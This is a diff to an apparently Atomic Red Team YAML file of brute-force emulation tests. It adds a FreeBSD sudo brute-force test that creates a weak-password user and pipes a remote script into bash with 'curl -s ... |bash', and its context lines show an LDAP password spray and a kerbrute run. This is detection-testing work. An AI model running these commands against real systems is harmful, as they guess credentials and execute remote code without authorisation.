@@ -57,7 +57,7 @@ atomic_tests:
       [System.Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols") | Out-Null
       $di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier("#{domain}",389)
 
-      $passwordList = Get-Content -Path #{passwords_path}
+      $passwordList = Get-Content -Path "#{passwords_path}"
       foreach ($password in $passwordList){
         $credz = new-object System.Net.NetworkCredential("#{user}", $password, "#{domain}")
         $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::#{auth})
@@ -137,21 +137,22 @@ atomic_tests:
   - description: |
       kerbrute.exe must exist in PathToAtomicsFolder\..\ExternalPayloads
     prereq_command: |
-      if (test-path PathToAtomicsFolder\..\ExternalPayloads\kerbrute.exe){exit 0} else {exit 1}
+      if (test-path "PathToAtomicsFolder\..\ExternalPayloads\kerbrute.exe"){exit 0} else {exit 1}
     get_prereq_command: |
       New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
       invoke-webrequest "https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_386.exe" -outfile "PathToAtomicsFolder\..\ExternalPayloads\kerbrute.exe"
   - description: |
       bruteuser.txt must exist in PathToAtomicsFolder\..\ExternalPayloads
     prereq_command: |
-      if (test-path PathToAtomicsFolder\..\ExternalPayloads\bruteuser.txt){exit 0} else {exit 1}
+      if (test-path "PathToAtomicsFolder\..\ExternalPayloads\bruteuser.txt"){exit 0} else {exit 1}
     get_prereq_command: |
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
       invoke-webrequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.001/src/bruteuser.txt?raw=true" -outfile "PathToAtomicsFolder\..\ExternalPayloads\bruteuser.txt"
   executor:
     name: powershell
     elevation_required: false
     command: |
-      cd PathToAtomicsFolder\..\ExternalPayloads
+      cd "PathToAtomicsFolder\..\ExternalPayloads"
       .\kerbrute.exe bruteuser --dc #{domaincontroller} -d #{domain} $env:temp\bruteuser.txt TestUser1 
 
 - name: SUDO Brute Force - Debian
@@ -225,6 +226,43 @@ atomic_tests:
       curl -s #{remote_url} |bash
     cleanup_command: |
       userdel -fr art
+
+- name: SUDO Brute Force - FreeBSD
+  auto_generated_guid: abcde488-e083-4ee7-bc85-a5684edd7541
+  description: |
+    An adversary may find themselves on a box (e.g. via ssh key auth, with no password) with a user that has sudo'ers privileges, but they do not know the users password. Normally, failed attempts to access root will not cause the root account to become locked, to prevent denial-of-service. This functionality enables an attacker to undertake a local brute force password guessing attack without locking out the root user. 
+
+    This test creates the "art" user with a password of "password123", logs in, downloads and executes the sudo_bruteforce.sh which brute force guesses the password, then deletes the user
+  supported_platforms:
+  - linux
+  input_arguments:
+    remote_url:
+      description: url of remote payload
+      type: url
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh
+  dependency_executor_name: sh
+  dependencies:
+  - description: |
+      Check if running on a FreeBSD based machine.
+    prereq_command: |
+      if grep -iq "FreeBSD" /etc/os-release; then echo "FreeBSD"; else echo "NOT FreeBSD"; exit 1; fi
+      if [ -x "$(command -v openssl)" ]; then echo "openssl is installed"; else echo "openssl is NOT installed"; exit 1; fi
+      if [ -x "$(command -v sudo)" ]; then echo "sudo is installed"; else echo "sudo is NOT installed"; exit 1; fi
+      if [ -x "$(command -v curl)" ]; then echo "curl is installed"; else echo "curl is NOT installed"; exit 1; fi
+      if [ -x "$(command -v bash)" ]; then echo "bash is installed"; else echo "bash is NOT installed"; exit 1; fi
+    get_prereq_command: |
+      pkg update && pkg install -y sudo curl bash
+  executor:
+    name: bash
+    elevation_required: true
+    command: |
+      pw adduser art -g wheel -s /bin/sh
+      echo "password123" | pw usermod art -h 0
+      su art
+      cd /tmp
+      curl -s #{remote_url} |bash
+    cleanup_command: |
+      rmuser -y art
 - name: ESXi - Brute Force Until Account Lockout
   auto_generated_guid: f0b443ae-9565-11ee-b9d1-0242ac120002
   description: |
@@ -261,5 +299,3 @@ atomic_tests:
         }
     name: powershell
     elevation_required: false
-
-
